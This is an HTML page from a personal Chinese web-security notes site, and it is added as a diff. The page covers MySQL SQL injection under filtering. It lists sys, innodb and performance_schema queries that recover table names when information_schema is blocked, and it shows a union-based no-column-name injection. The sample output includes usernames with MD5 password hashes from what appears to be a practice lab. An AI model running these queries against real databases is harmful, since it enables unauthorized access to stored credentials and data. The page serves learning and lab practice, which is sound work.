@@ -1,0 +1,656 @@
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.4.0">
+    
+    
+      
+        <title>SQL注入限制条件下获取表名&无列名注入 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.fe0cca5b.min.css">
+      
+      
+    
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="My Docs" class="md-header-nav__button md-logo" aria-label="My Docs">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            My Docs
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              SQL注入限制条件下获取表名&无列名注入
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+        
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Web基础嗷
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="Web基础嗷" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        Web基础嗷
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Overview/" title="Web概述" class="md-nav__link">
+      Web概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Server%26Middleware/" title="服务器&中间件" class="md-nav__link">
+      服务器&中间件
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../BasisDatabaseSyntax/" title="数据库基础" class="md-nav__link">
+      数据库基础
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../include/" title="文件包含" class="md-nav__link">
+      文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        SQL注入限制条件下获取表名&无列名注入
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="SQL注入限制条件下获取表名&无列名注入" class="md-nav__link md-nav__link--active">
+      SQL注入限制条件下获取表名&无列名注入
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    获取表名
+  </a>
+  
+    <nav class="md-nav" aria-label="获取表名">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#innodb" class="md-nav__link">
+    innodb存储引擎
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sys" class="md-nav__link">
+    sys
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    无列名注入
+  </a>
+  
+    <nav class="md-nav" aria-label="无列名注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#join" class="md-nav__link">
+    利用join进行无列名注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      👴平常记录的
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="👴平常记录的" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        👴平常记录的
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../usually/" title="Test" class="md-nav__link">
+      Test
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../usually/email/" title="邮箱收集渗透钓鱼" class="md-nav__link">
+      邮箱收集渗透钓鱼
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    获取表名
+  </a>
+  
+    <nav class="md-nav" aria-label="获取表名">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#innodb" class="md-nav__link">
+    innodb存储引擎
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sys" class="md-nav__link">
+    sys
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    无列名注入
+  </a>
+  
+    <nav class="md-nav" aria-label="无列名注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#join" class="md-nav__link">
+    利用join进行无列名注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  
+                
+                
+                <h1 id="sql">SQL注入限制条件下获取表名&amp;无列名注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<div class="toc">
+<ul>
+<li><a href="#sql">SQL注入限制条件下获取表名&amp;无列名注入</a><ul>
+<li><a href="#_1">获取表名</a><ul>
+<li><a href="#innodb">innodb存储引擎</a></li>
+<li><a href="#sys">sys</a></li>
+</ul>
+</li>
+<li><a href="#_2">无列名注入</a><ul>
+<li><a href="#join">利用join进行无列名注入</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+<h2 id="_1">获取表名<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="innodb">innodb存储引擎<a class="headerlink" href="#innodb" title="Permanent link">&para;</a></h3>
+<p>Mysql&gt;5.6.x
+对于waf掉<code>information_schema</code>，可以利用<code>innodb_table_stats</code>和<code>innodb_table_stats</code>两个表来查询到
+但是mysql默认是关闭InnoDB存储引擎的
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_index_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+</code></pre></div></p>
+<h3 id="sys">sys<a class="headerlink" href="#sys" title="Permanent link">&para;</a></h3>
+<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名
+<div class="highlight"><pre><span></span><code><span class="o">//</span><span class="err">包含</span><span class="k">in</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">where</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_index_statistics</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">schema_auto_increment_columns</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span><span class="err">不包含</span><span class="k">in</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_flattened_keys</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$ps_schema_table_statistics_io</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_table_statistics_with_buffer</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span><span class="err">通过表文件的存储路径获取表名</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_latency</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+包含之前查询记录的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">x$statement_analysis</span> <span class="k">WHERE</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">statement_analysis</span><span class="o">`</span> <span class="k">where</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+performance_schema
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">objects_summary_global_by_type</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_handles</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_index_usage</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_lock_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+包含之前查询记录的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">digest_text</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">events_statements_summary_by_digest</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">digest_text</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+包含表文件路径的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">file_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">file_instances</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">file_name</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div></p>
+<h2 id="_2">无列名注入<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="join">利用<code>join</code>进行无列名注入<a class="headerlink" href="#join" title="Permanent link">&para;</a></h3>
+<p><code>select 1,2,3,4 union select * from users;</code>  </p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+<td>4</td>
+</tr>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>e10adc3949ba59abbe56e057f20f883e</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pikachu</td>
+<td>670b14728ad9902aecba32e22fa4f6bd</td>
+<td>2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>test</td>
+<td>e99a18c428cb38d5f260853678922e03</td>
+<td>3</td>
+</tr>
+</tbody>
+</table>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../include/" title="文件包含" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                文件包含
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../usually/" title="Test" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Test
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.d710d30a.min.js"></script>
+      <script src="../../assets/javascripts/bundle.b39636ac.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.a68abb33.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
